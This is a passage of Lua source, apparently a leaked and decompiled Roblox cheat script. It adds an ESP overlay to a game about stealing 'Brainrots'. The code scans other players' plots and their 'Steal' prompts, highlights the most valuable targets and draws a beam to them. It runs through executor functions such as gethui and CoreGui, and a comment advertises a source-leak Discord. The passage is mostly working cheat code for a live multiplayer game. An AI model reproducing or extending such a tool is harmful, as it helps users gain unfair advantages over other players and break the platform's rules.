			beam4.Width1 = 0.22
			obj[beam4] = true
			beam4.Parent = attachment4
			flag266 = parent
			flag267 = parent2
		end

		func411 = function(param143)
			func466(param143)

			pcall(function()
				param143.Billboard:Destroy()
			end)

			pcall(function()
				param143.Highlight:Destroy()
			end)

			if flag267 == param143.Root then
				func409()
			end
		end
	end

	func412 = function()
		for k, value339 in pairs(tbl82) do
			func411(value339)
			tbl82[k] = nil
		end
	end

	n4 = 14

	do
		local value340 = nil
		local obj2 = setmetatable({}, { __mode = "k" })

		func413 = function(instance72)
			if value340 and value340.Parent then
				return instance72 == value340
			end
			local plotSign = instance72 and instance72:FindFirstChild("PlotSign")
			if not plotSign then
				return false
			end
			local lowered9 = string.lower(localPlayer.Name)
			local lowered10 = string.lower(localPlayer.DisplayName)

			for _, descendant in ipairs(plotSign:GetDescendants()) do
				if descendant:IsA("TextLabel") then
					local lowered11 = string.lower(tostring(descendant.Text or ""))
					if lowered11 == "your base" or string.find(lowered11, lowered9, 1, true) or string.find(lowered11, lowered10, 1, true) then
						value340 = instance72
						return true
					end
				end
			end

			return false
		end

		local function func467(param144, list73)
			local entry30 = obj2[param144]
			if entry30 and entry30.Parent and tostring(entry30.ActionText) == "Steal" then
				return entry30
			end
			obj2[param144] = nil

			for _, descendant in ipairs(list73:GetDescendants()) do
				if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == "Steal" then
					obj2[param144] = descendant
					return descendant
				end
			end

			return nil
		end

		func414 = function(instance73)
			local tbl114 = {}
			local animalPodiums = instance73 and instance73:FindFirstChild("AnimalPodiums")
			if not animalPodiums then
				return tbl114
			end

			for _, child in ipairs(animalPodiums:GetChildren()) do
				local base = child:FindFirstChild("Base")
				base = base and base:FindFirstChild("Spawn")

				if base and base:IsA("BasePart") then
					local value341 = func467(child, base:FindFirstChild("PromptAttachment") or base)

					if value341 then
						local str31 = tostring(value341.ObjectText or "")

						if str31 ~= "" then
							local list74 = tbl114[str31]

							if not list74 then
								list74 = {}
								tbl114[str31] = list74
							end

							list74[#list74 + 1] = base.Position
						end
					end
				end
			end

			return tbl114
		end
	end
end

do
	local function func468(part22, list75)
		if not (part22 and list75) then
			return false
		end

		for _, item66 in ipairs(list75) do
			if (part22.Position - item66).Magnitude <= n4 then
				return true
			end
		end

		return false
	end

	local function func469()
		local plots = Workspace:FindFirstChild("Plots")
		if not plots then
			func412()
			return
		end
		local tbl115 = {}

		for _, child in ipairs(plots:GetChildren()) do
			if not func413(child) then
				local tbl116 = func414(child)

				for _, child2 in ipairs(child:GetChildren()) do
					if child2:IsA("Model") and byName4[child2.Name] then
						local value342 = func401(child2)

						if func468(value342, tbl116[child2.Name]) then
							tbl115[child2] = true
							local entry31 = tbl82[child2]

							if entry31 and entry31.Root ~= value342 then
								func411(entry31)
								entry31 = nil
							end

							if not entry31 then
								local value343 = func402(child2, value342)
								tbl82[child2] = value343
								func403(value343)
							end
						end
					end
				end
			end
		end

		for k, value344 in pairs(tbl82) do
			if not tbl115[k] or not k.Parent then
				func411(value344)
				tbl82[k] = nil
			end
		end
	end

	local function func470()
		if not flag262 then
			return
		end
		flag262 = false
		func246(list65)
		func409()
		func412()
	end

	local function func471()
		if flag262 then
			return
		end
		flag262 = true
		func469()
		local n5 = 0

		list65[#list65 + 1] = RunService.RenderStepped:Connect(function()
			if not flag262 then
				return
			end
			local now = os.clock()

			if n5 <= now then
				n5 = now + 1
				func469()
			end

			local generation = nil
			local value345 = nil

			for _, value346 in pairs(tbl82) do
				if value346.Root.Parent then
					local flag307 = flag264

					if not flag264 then
						flag307 = (value346.Generation or 0) >= n3
					end

					if flag307 and (not generation or value346.Generation > generation) then
						generation = value346.Generation
						value345 = value346
					end
				end
			end

			for _, value347 in pairs(tbl82) do
				local value348 = func408(value347, value347 == value345)
				value347.Billboard.Enabled = value348
				value347.Highlight.Enabled = value348

				if value348 then
					value347.NameRow.Holder.Visible = flag265.Name
					value347.ValueRow.Holder.Visible = flag265.Value
					pcall(func405, value347, now)
					pcall(func404, value347, now)
					pcall(func406, value347, now)
					pcall(func407, value347, now)

					if flag265.Rarity and value347.SourceRarityGrad and value347.SourceRarityGrad.Parent then
						pcall(function()
							value347.RarityRow.TextGradient.Offset = value347.SourceRarityGrad.Offset
							value347.RarityRow.TextGradient.Rotation = value347.SourceRarityGrad.Rotation
							value347.RarityRow.TextGradient.Color = value347.SourceRarityGrad.Color
						end)
					end

					if flag265.Mutation and value347.SourceMutationGrad and value347.SourceMutationGrad.Parent then
						pcall(function()
							value347.MutationRow.TextGradient.Offset = value347.SourceMutationGrad.Offset
							value347.MutationRow.TextGradient.Rotation = value347.SourceMutationGrad.Rotation
							value347.MutationRow.TextGradient.Color = value347.SourceMutationGrad.Color
						end)
					end
				end
			end

			local result28 = func247()
			local value349 = flag263
			local flag308

			if flag263 then
				flag308 = value345
			else
				flag308 = value349
			end

			if not (flag308 and result28) then
				if attachment then
					func409()
				end
			else
				local flag309 = flag266 ~= result28 or flag267 ~= value345.Root

				if not flag309 then
					flag309 = not (attachment and attachment.Parent)
				end

				if flag309 then
					func410(result28, value345.Root, value345.BeamTint)
				end
			end
		end)
	end

	value289.Event:Connect(func470)
	chilliBrainrotESPRuntime.Destroying:Connect(func470)

	local value350 = obj53:CreateToggle({
		Name = "Brainrot ESP",
		Default = true,
		Callback = function(value)
			if value then
				func471()
			else
				func470()
			end
		end,
	})

	obj53:CreateSlider({
		Name = "Brainrot ESP Size",
		Min = 50,
		Max = 200,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = value350,
		Callback = function(value)
			n2 = math.clamp((tonumber(value) or 100) / 100, 0.5, 2)

			for _, value351 in pairs(tbl82) do
				func403(value351)
			end
		end,
	})

	obj53:CreateMultiDropdown({
		Name = "Show Information",
		Note = "Choose what each Brainrot tag shows.",
		Options = { "Name", "Mutation", "Value", "Trails", "Rarity" },
		Default = { "Name", "Value", "Trails" },
		Quick = false,
		SubOf = value350,
		Callback = function(value)
			local tbl117 = { Name = false, Mutation = false, Value = false, Trails = false, Rarity = false }

			if type(value) == "table" then
				for k, value352 in pairs(value) do
					if type(value352) == "string" then
						if tbl117[value352] ~= nil then
							tbl117[value352] = true
						elseif value352 == "Type" then
							tbl117.Rarity = true
						end
					elseif type(k) == "string" and value352 == true then
						if tbl117[k] ~= nil then
							tbl117[k] = true
						elseif k == "Type" then
							tbl117.Rarity = true
						end
					end
				end
			end

			flag265 = tbl117
		end,
	})
	--[=[ 𝐒𝐨𝐮𝐫𝐜𝐞 𝐋𝐞𝐚𝐤 (𝐒𝐋) ]=] -- discord.gg/x7YbZeezpm

	local value353 = nil
	local n5 = 1
	local str32 = "M/s"

	local function func472(flag310, flag311)
		if flag310 ~= nil then
			n5 = math.floor(tonumber(flag310) or n5)
		end

		if flag311 ~= nil then
			str32 = tostring(flag311)
		elseif value353 and value353.GetUnit then
			local unit = value353:GetUnit()

			if unit and unit ~= "" then
				str32 = tostring(unit)
			end
		end

		n3 = n5 * (tbl83[str32] or tbl83["M/s"]).Mult
	end

	local function func473(param145)
		str32 = param145
		local ms = tbl83[param145] or tbl83["M/s"]

		if value353 and value353.SetRange then
			value353:SetRange(ms.Min, ms.Max)
			local min = value353:Get() or ms.Min
			local min2 = ms.Min
			local max = ms.Max
			local n6 = math.clamp(math.floor(min + 0.5), min2, max)

			if n6 ~= min then
				value353:Set(n6)
			else
				func472(n6, param145)
			end
		else
			func472(nil, param145)
		end
	end

	value353 = obj53:CreateSlider({
		Name = "Brainrot ESP Min Value",
		Note = "Filters out Brainrots below this threshold. Tap arrow to change unit (K/s, M/s, B/s).",
		Min = 0,
		Max = 1000,
		Default = 1,
		AllowDecimals = false,
		Increment = 1,
		Unit = {
			Default = "M/s",
			Selector = true,
			Options = { "K/s", "M/s", "B/s" },
			ColorEnabled = true,
			Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
			Callback = function(value)
				func473(value)
			end,
		},
		Quick = false,
		SubOf = value350,
		Callback = function(value)
			func472(value, nil)
		end,
	})

	obj53:CreateToggle({
		Name = "Best Brainrot Only",
		Default = true,
		Quick = false,
		SubOf = value350,
		Callback = function(value)
			flag264 = value == true
		end,
	})

	obj53:CreateToggle({
		Name = "Beam To Best",
		Note = "Draws one beam from you to the highest generation Brainrot.",
		Default = true,
		Quick = false,
		SubOf = value350,
		Callback = function(value)
			flag263 = value == true
		end,
	})
end

local str33
str33 = "__ChilliBrainrotNotificationRuntime"
local n5
n5 = 0.75
local n6
n6 = 3
local chilliBrainrotNotificationRuntim, value354
chilliBrainrotNotificationRuntim, value354 = func245("__ChilliBrainrotNotificationRuntime")
local flag312
flag312 = false
local str34
str34 = ""
local soundId
soundId = ""
local str35
str35 = ""
local n7
n7 = 1000000
local flag313
flag313 = true
local n8
n8 = 0
local n9
n9 = 0
local connection
connection = nil
local obj2
obj2 = setmetatable({}, { __mode = "k" })
local value355
value355 = nil
local list76, obj90, flag314, TweenService, font, byName7, tbl118, tbl119
local value356 = nil
list76 = {}
obj90 = nil
flag314 = nil
TweenService = game:GetService("TweenService")
font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
byName7 = {}
tbl118 = {}
tbl119 = {}

pcall(function()
	local Animals = require(ReplicatedStorage.Datas.Animals)

	if type(Animals) == "table" then
		byName7 = Animals
	end
end)

pcall(function()
	local Mutations = require(ReplicatedStorage.Datas.Mutations)

	if type(Mutations) == "table" then
		tbl118 = Mutations
	end
end)

pcall(function()
	local Traits = require(ReplicatedStorage.Datas.Traits)

	if type(Traits) == "table" then
		tbl119 = Traits
	end
end)

pcall(function()
	local Gradients = require(ReplicatedStorage.Packages.Gradients)

	if type(Gradients) == "table" then
		value356 = Gradients
	end
end)

local tbl120
tbl120 = {}

do
	local tbl121 = { Preset = "Zebra", Background = Color3.fromRGB(16, 16, 20) }
	local colorSequence = ColorSequence.new
	local value357 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
	local value358 = ColorSequenceKeypoint.new(0.24, Color3.fromRGB(45, 45, 55))
	local value359 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
	local value360 = ColorSequenceKeypoint.new(0.76, Color3.fromRGB(45, 45, 55))
	local tbl122 = { value357, value358, value359, value360 }

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
		table.move(values, 1, values.n, 5, tbl122)
	end

	tbl121.Colors = colorSequence(tbl122)
	tbl120["Secret Zebra"] = tbl121
end

local func474, func475

do
	local function func476()
		if value355 then
			return value355
		end
		local controllers = ReplicatedStorage:FindFirstChild("Controllers")
		controllers = controllers and controllers:FindFirstChild("NotificationController")
		if not (controllers and controllers:IsA("ModuleScript")) then
			return nil
		end
		local ok, result = pcall(require, controllers)

		if ok and type(result) == "table" then
			value355 = result
		end

		return value355
	end

	local function func477(flag315)
		local match = tostring(flag315 or ""):match("(%d+)")
		if match and tonumber(match) and tonumber(match) > 0 then
			return "rbxassetid://" .. match
		end
		return nil
	end

	local function func478(instance74)
		if not instance74 then
			return nil
		end

		if instance74:IsA("Sound") then
			return func477(instance74.SoundId)
		end

		if instance74:IsA("StringValue") then
			local value361 = func477(instance74.Value)
			if value361 then
				return value361
			end
		end

		local value362 = func477(instance74:GetAttribute("SoundId"))
		if value362 then
			return value362
		end
		local sound = instance74:FindFirstChildWhichIsA("Sound", true)
		return sound and func477(sound.SoundId) or nil
	end

	local function func479()
		local func480 = ipairs
		local tbl123 = {}
		local packed4 = table.pack(game:GetService("SoundService"))
		tbl123[1] = ReplicatedStorage

		do
			local values = table.pack(table.unpack(packed4, 1, packed4.n))
			table.move(values, 1, values.n, 2, tbl123)
		end

		for _, value363 in func480(tbl123) do
			local crystalSpawn = value363:FindFirstChild("CrystalSpawn", true)
			local value364 = func478(crystalSpawn)
			if value364 then
				return value364
			end
		end

		return ""
	end

	func474 = function(flag316)
		str34 = tostring(flag316 or "")
	end

	func475 = function()
		local str36 = func477(str34)

		if not str36 then
			soundId = str35
			obj1.Notify("Sound ID Failed", "Invalid asset ID. Restored the default Crystal sound.", 5)
			return false
		end

		local sound = Instance.new("Sound")
		sound.Name = "ChilliSoundIdValidation"
		sound.SoundId = str36
		sound.Volume = 0
		sound.Parent = game:GetService("SoundService")
		local flag317 = false

		local isLoaded = pcall(function()
			game:GetService("ContentProvider"):PreloadAsync({ sound }, function(param146, flag318)
				if flag318 == Enum.AssetFetchStatus.Success then
					flag317 = true
				end
			end)
		end) and (flag317 or sound.IsLoaded or sound.TimeLength > 0)

		sound:Destroy()

		if not isLoaded then
			soundId = str35
			obj1.Notify("Sound ID Failed", "Audio unavailable. Restored the default Crystal sound.", 5)
			return false
		end

		soundId = str36
		str34 = str36
		obj1.Notify("Sound ID Applied", str36 .. " is now used for Brainrot notifications.", 5)
		return true
	end

	local function func481()
		if soundId == "" then
			return
		end
		local sound = Instance.new("Sound")
		sound.Name = "ChilliBrainrotNotificationSound"
		sound.SoundId = soundId
		sound.Volume = 1
		sound.Parent = game:GetService("SoundService")

		if not pcall(function()
			sound:Play()
		end) then
			sound:Destroy()
			return
		end

		game:GetService("Debris"):AddItem(sound, 15)
	end

	str35 = func479()
	soundId = str35
	str34 = soundId

	local function func482(parent, param147)
		local uiGradient = Instance.new("UIGradient")
		uiGradient.Color = param147.Colors
		uiGradient.Rotation = 8
		uiGradient.Parent = parent
		local tween = TweenService:Create(uiGradient, TweenInfo.new(1.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), { Rotation = 368 })
		tween:Play()

		return function()
			tween:Cancel()
		end
	end

	local function func483(obj91, parent, name, text, position, size, textSize)
		local clone = obj91:Clone()
		clone.Name = name
		clone.Visible = true
		clone.RichText = true
		clone.BackgroundTransparency = 1
		clone.AutomaticSize = Enum.AutomaticSize.None
		clone.AnchorPoint = Vector2.zero
		clone.Position = position
		clone.Size = size
		clone.Text = text
		clone.TextScaled = false
		clone.TextSize = textSize
		clone.TextXAlignment = Enum.TextXAlignment.Left
		clone.TextYAlignment = Enum.TextYAlignment.Center
		clone.FontFace = font
		clone.Parent = parent
		return clone
	end

	local function func484(parent, part23, instance75)
		if not (instance75 and instance75.Parent) then
			return false
		end

		local ok, result = pcall(function()
			return instance75:Clone()
		end)

		if not ok or not result then
			return false
		end

		for _, descendant in ipairs(result:GetDescendants()) do
			if descendant:IsA("ParticleEmitter") or descendant:IsA("Beam") or descendant:IsA("Trail") or descendant:IsA("Light") or descendant:IsA("Sound") or descendant:IsA("Script") or descendant:IsA("LocalScript") then
				descendant:Destroy()
			end
		end

		local worldModel = Instance.new("WorldModel")
		worldModel.Parent = parent
		result.Parent = worldModel

		pcall(function()
			result:PivotTo(CFrame.new())
		end)

		local cframe = CFrame.new()

		local ok2, result2, result3 = pcall(function()
			return result:GetBoundingBox()
		end)

		ok2 = ok2 and result2 and result3
		local vector = Vector3.new(4, 4, 4)

		if not ok2 then
			result3 = vector
			result2 = cframe
		end

		local position = result2.Position
		local n10 = math.max(math.max(result3.X, result3.Y, result3.Z) * 1.35, 3.5)
		part23.FieldOfView = 40
		part23.CFrame = CFrame.lookAt(position + Vector3.new(n10 * 0.28, n10 * 0.08, -n10), position, Vector3.new(0, 1, 0))
		local humanoid = instance75:FindFirstChildWhichIsA("Humanoid") or instance75:FindFirstChildWhichIsA("AnimationController")
		humanoid = humanoid and humanoid:FindFirstChildOfClass("Animator")
		local humanoid2 = result:FindFirstChildWhichIsA("Humanoid") or result:FindFirstChildWhichIsA("AnimationController")
		local animator = humanoid2 and humanoid2:FindFirstChildOfClass("Animator")

		if humanoid and animator then
			local playingAnimationTracks = humanoid:GetPlayingAnimationTracks()
			playingAnimationTracks = playingAnimationTracks and playingAnimationTracks[1]

			if playingAnimationTracks and playingAnimationTracks.Animation then
				local animation = Instance.new("Animation")
				animation.AnimationId = playingAnimationTracks.Animation.AnimationId

				local ok3, result4 = pcall(function()
					return animator:LoadAnimation(animation)
				end)

				if ok3 and result4 then
					pcall(function()
						result4.Looped = true
						result4:Play(0)
						result4.TimePosition = playingAnimationTracks.TimePosition
						result4:AdjustSpeed(playingAnimationTracks.Speed)
					end)
				end
			end
		end

		return true
	end

	local function func485(param148)
		local foundAt3 = table.find(list76, param148)

		if foundAt3 then
			table.remove(list76, foundAt3)
		end
	end

	local function createFrame()
		if flag314 and flag314.Parent then
			return flag314
		end
		local parent = CoreGui

		if type(gethui) == "function" then
			local ok
			ok, parent = pcall(gethui)
			ok = ok and typeof(parent) == "Instance"
			local value365 = CoreGui

			if not ok then
				parent = value365
			end
		end

		local name = str33 .. "Gui"
		local obj92 = parent:FindFirstChild(name)

		if obj92 then
			pcall(function()
				obj92:Destroy()
			end)
		end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.DisplayOrder = 190
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.Parent = parent
		local frame = Instance.new("Frame")
		frame.Name = "NotificationStack"
		frame.AnchorPoint = Vector2.new(0.5, 0)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Position = UDim2.fromScale(0.5, 0.025)
		frame.Size = UDim2.new(1, -16, 0.55, 0)
		frame.Parent = screenGui
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Vertical
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		uiListLayout.Padding = UDim.new(0, 5)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
		uiListLayout.Parent = frame
		obj90 = screenGui
		flag314 = frame
		return frame
	end

	local function func486()
		local currentCamera = Workspace.CurrentCamera
		local x = currentCamera and currentCamera.ViewportSize.X or 1280

		if x <= 0 then
			x = 1280
		end

		return math.clamp((x - 24) / 620, 0.44, 0.72)
	end

	local function func487(flag319, flag320, flag321)
		local secretZebra = tbl120[flag321 or "Secret Zebra"] or tbl120["Secret Zebra"]
		if type(flag319) ~= "table" or not flag319.Model then
			return false
		end
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		local notification = playerGui and playerGui:FindFirstChild("Notification")
		notification = notification and notification:FindFirstChild("Notification")
		notification = notification and notification:FindFirstChild("Template")

		if not (notification and notification:IsA("TextLabel")) then
			local result29 = func476()

			if result29 and type(result29.Notify) == "function" then
				local uppered = string.upper(tostring(flag319.Name or "Brainrot")) .. " APPEARED!  " .. tostring(flag319.ValueText or "")
				local func488 = pcall
				local notify = result29.Notify
				flag320 = flag320 or 6
				local top = func488(notify, result29, uppered, flag320, nil, "Top")

				if top then
					func481()
				end

				return top
			end

			return false
		end

		local frame9 = createFrame()
		if not frame9 then
			return false
		end

		while #list76 >= 4 do
			local obj93 = table.remove(list76, 1)

			if obj93 and obj93.Parent then
				obj93:Destroy()
			end
		end

		local frame = Instance.new("Frame")
		frame.Name = "ChilliSpecialNotificationSlot"
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		local result30 = func486()
		frame.Size = UDim2.new(1, 0, 0, math.ceil(108 * result30 + 7))
		frame.ZIndex = 179
		frame.Parent = frame9
		list76[#list76 + 1] = frame
		local frame2 = Instance.new("Frame")
		frame2.Name = "ScaledCardRoot"
		frame2.AnchorPoint = Vector2.new(0.5, 0)
		frame2.BackgroundTransparency = 1
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.fromScale(0.5, 0)
		local ceil = math.ceil
		frame2.Size = UDim2.fromOffset(math.ceil(620 * result30), ceil(108 * result30))
		frame2.ZIndex = 179
		frame2.Parent = frame
		local uiScale = Instance.new("UIScale")
		uiScale.Scale = result30 * 0.72
		uiScale.Parent = frame2
		local frame3 = Instance.new("Frame")
		frame3.Name = "ChilliSpecialNotification"
		frame3.BackgroundColor3 = secretZebra.Background
		frame3.BackgroundTransparency = 0.04
		frame3.BorderSizePixel = 0
		frame3.ClipsDescendants = false
		frame3.AnchorPoint = Vector2.new(0.5, 0)
		frame3.Position = UDim2.fromOffset(310, 0)
		frame3.Size = UDim2.fromOffset(620, 108)
		frame3.ZIndex = 180
		frame3.Parent = frame2
		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = UDim.new(0, 17)
		uiCorner.Parent = frame3
		local uiGradient = Instance.new("UIGradient")
		local colorSequence = ColorSequence.new
		local value366 = ColorSequenceKeypoint.new(0, secretZebra.Background)
		local value367 = ColorSequenceKeypoint.new(0.48, secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.12))
		local new = ColorSequenceKeypoint.new
		local background = secretZebra.Background
		local tbl124 = { value366, value367 }

		do
			local values = table.pack(new(1, background))
			table.move(values, 1, values.n, 3, tbl124)
		end

		uiGradient.Color = colorSequence(tbl124)
		uiGradient.Rotation = 12
		uiGradient.Parent = frame3
		local uiStroke = Instance.new("UIStroke")
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke.Color = Color3.new(1, 1, 1)
		uiStroke.Thickness = 2.5
		uiStroke.Transparency = 0.05
		uiStroke.Parent = frame3
		local uiGradient2 = Instance.new("UIGradient")
		uiGradient2.Color = secretZebra.Colors
		uiGradient2.Parent = uiStroke
		local tween = TweenService:Create(uiGradient2, TweenInfo.new(2.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), { Rotation = 360 })
		tween:Play()
		local uiStroke2 = Instance.new("UIStroke")
		uiStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke2.Color = secretZebra.Colors.Keypoints[1].Value
		uiStroke2.Thickness = 7
		uiStroke2.Transparency = 0.72
		uiStroke2.Parent = frame3
		local viewportFrame = Instance.new("ViewportFrame")
		viewportFrame.Name = "BrainrotPreview"
		viewportFrame.Ambient = Color3.fromRGB(190, 190, 200)
		viewportFrame.BackgroundColor3 = secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.08)
		viewportFrame.BackgroundTransparency = 0.08
		viewportFrame.BorderSizePixel = 0
		viewportFrame.ClipsDescendants = true
		viewportFrame.LightColor = Color3.fromRGB(255, 255, 255)
		viewportFrame.LightDirection = Vector3.new(-0.4, -0.7, -0.6)
		viewportFrame.Position = UDim2.fromOffset(11, 9)
		viewportFrame.Size = UDim2.fromOffset(90, 90)
		viewportFrame.ZIndex = 183
		viewportFrame.Parent = frame3
		local uiCorner2 = Instance.new("UICorner")
		uiCorner2.CornerRadius = UDim.new(0, 14)
		uiCorner2.Parent = viewportFrame
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Color = Color3.new(1, 1, 1)
		uiStroke3.Thickness = 2
		uiStroke3.Transparency = 0.18
		uiStroke3.Parent = viewportFrame
		local uiGradient3 = Instance.new("UIGradient")
		uiGradient3.Color = secretZebra.Colors
		uiGradient3.Rotation = -25
		uiGradient3.Parent = uiStroke3
		local camera = Instance.new("Camera")
		camera.Parent = viewportFrame
		viewportFrame.CurrentCamera = camera
		func484(viewportFrame, camera, flag319.Model)
		local brainrotName = func483(notification, frame3, "BrainrotName", tostring(flag319.Name or "Brainrot"), UDim2.fromOffset(115, 7), UDim2.new(1, -252, 0, 34), 22)
		brainrotName.RichText = false
		brainrotName.TextColor3 = Color3.new(1, 1, 1)
		brainrotName.TextTruncate = Enum.TextTruncate.AtEnd
		brainrotName.Font = Enum.Font.GothamBlack
		brainrotName.ZIndex = 183
		local list77 = {}

		local function func489(parent, thickness)
			local uiStroke4 = Instance.new("UIStroke")
			uiStroke4.Name = "SpecialTextOutline"
			uiStroke4.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke4.Color = Color3.fromRGB(0, 0, 0)
			uiStroke4.Thickness = thickness or 1.15
			uiStroke4.Transparency = 0.18
			uiStroke4.Parent = parent
			local value368 = func482(parent, secretZebra)

			if value368 then
				list77[#list77 + 1] = value368
			end
		end

		func489(brainrotName, 1.35)
		local frame4 = Instance.new("Frame")
		frame4.Name = "AppearedBadge"
		frame4.AnchorPoint = Vector2.new(1, 0)
		frame4.BackgroundColor3 = secretZebra.Colors.Keypoints[1].Value
		frame4.BackgroundTransparency = 0.08
		frame4.BorderSizePixel = 0
		frame4.Position = UDim2.new(1, -13, 0, 10)
		frame4.Size = UDim2.fromOffset(112, 25)
		frame4.ZIndex = 183
		frame4.Parent = frame3
		local uiCorner3 = Instance.new("UICorner")
		uiCorner3.CornerRadius = UDim.new(1, 0)
		uiCorner3.Parent = frame4
		local uiGradient4 = Instance.new("UIGradient")
		uiGradient4.Color = secretZebra.Colors
		uiGradient4.Rotation = 12
		uiGradient4.Parent = frame4
		local uiStroke4 = Instance.new("UIStroke")
		uiStroke4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke4.Color = Color3.new(1, 1, 1)
		uiStroke4.Thickness = 1.25
		uiStroke4.Transparency = 0.2
		uiStroke4.Parent = frame4
		local appearedText = func483(notification, frame4, "AppearedText", "APPEARED!", UDim2.fromOffset(6, 0), UDim2.new(1, -12, 1, 0), 12)
		appearedText.RichText = false
		appearedText.Font = Enum.Font.Arcade
		appearedText.TextColor3 = Color3.new(1, 1, 1)
		appearedText.TextXAlignment = Enum.TextXAlignment.Center
		appearedText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
		appearedText.TextStrokeTransparency = 0.25
		appearedText.ZIndex = 184
		local frame5 = Instance.new("Frame")
		frame5.Name = "GenerationBadge"
		frame5.BackgroundColor3 = Color3.fromRGB(4, 24, 10)
		frame5.BackgroundTransparency = 0.18
		frame5.BorderSizePixel = 0
		frame5.Position = UDim2.fromOffset(115, 44)
		frame5.Size = UDim2.fromOffset(142, 26)
		frame5.ZIndex = 183
		frame5.Parent = frame3
		local uiCorner4 = Instance.new("UICorner")
		uiCorner4.CornerRadius = UDim.new(0, 8)
		uiCorner4.Parent = frame5
		local uiStroke5 = Instance.new("UIStroke")
		uiStroke5.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke5.Color = Color3.fromRGB(75, 255, 104)
		uiStroke5.Thickness = 1.2
		uiStroke5.Transparency = 0.35
		uiStroke5.Parent = frame5
		local brainrotValue = func483(notification, frame5, "BrainrotValue", tostring(flag319.ValueText or ""), UDim2.fromOffset(9, 0), UDim2.new(1, -18, 1, 0), 18)
		brainrotValue.RichText = false
		brainrotValue.Font = Enum.Font.RobotoMono
		brainrotValue.TextColor3 = Color3.fromRGB(86, 255, 105)
		brainrotValue.TextStrokeColor3 = Color3.fromRGB(0, 32, 7)
		brainrotValue.TextStrokeTransparency = 0.15
		brainrotValue.ZIndex = 184
		local uiGradient5 = Instance.new("UIGradient")
		local colorSequence2 = ColorSequence.new
		local value369 = ColorSequenceKeypoint.new(0, Color3.fromRGB(42, 220, 76))
		local value370 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(208, 255, 132))
		local new2 = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		local tbl125 = { value369, value370 }

		do
			local values = table.pack(new2(1, color(38, 255, 105)))
			table.move(values, 1, values.n, 3, tbl125)
		end

		uiGradient5.Color = colorSequence2(tbl125)
		uiGradient5.Rotation = -8
		uiGradient5.Parent = brainrotValue
		local tween2 = TweenService:Create(uiGradient5, TweenInfo.new(1.45, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), { Rotation = 18 })
		tween2:Play()

		list77[#list77 + 1] = function()
			tween2:Cancel()
		end

		if flag319.MutationVisible then
			local brainrotMutation = func483(notification, frame3, "BrainrotMutation", tostring(flag319.MutationText or ""), UDim2.fromOffset(115, 76), UDim2.new(1, -304, 0, 22), 17)
			brainrotMutation.RichText = flag319.MutationRichText == true
			brainrotMutation.TextColor3 = flag319.MutationColor or Color3.fromRGB(235, 235, 240)
			brainrotMutation.TextStrokeColor3 = flag319.MutationStrokeColor or Color3.fromRGB(0, 0, 0)
			brainrotMutation.TextStrokeTransparency = flag319.MutationStrokeTransparency or 0.25
			brainrotMutation.TextTruncate = Enum.TextTruncate.AtEnd
			brainrotMutation.ZIndex = 183

			if flag319.MutationFontFace then
				brainrotMutation.FontFace = flag319.MutationFontFace
			end

			if flag319.MutationGradientColor then
				local uiGradient6 = Instance.new("UIGradient")
				uiGradient6.Color = flag319.MutationGradientColor
				uiGradient6.Rotation = flag319.MutationGradientRotation or 0
				uiGradient6.Transparency = flag319.MutationGradientTransparency or NumberSequence.new(0)
				uiGradient6.Parent = brainrotMutation
			else
				local uiStroke6 = Instance.new("UIStroke")
				uiStroke6.Name = "MutationGlow"
				uiStroke6.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
				uiStroke6.Color = flag319.MutationColor or Color3.new(1, 1, 1)
				uiStroke6.Thickness = 1.1
				uiStroke6.Transparency = 0.5
				uiStroke6.Parent = brainrotMutation
			end
		end

		local frame6 = Instance.new("Frame")
		frame6.AnchorPoint = Vector2.new(1, 0)
		frame6.BackgroundTransparency = 1
		frame6.Position = UDim2.new(1, -13, 0, 74)
		frame6.Size = UDim2.fromOffset(174, 28)
		frame6.ZIndex = 183
		frame6.Parent = frame3
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
		uiListLayout.Padding = UDim.new(0, 3)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		uiListLayout.Parent = frame6
		local func490 = ipairs
		local traitImages = flag319.TraitImages or {}

		for k, traitImage in func490(traitImages) do
			if not (k > 6) then
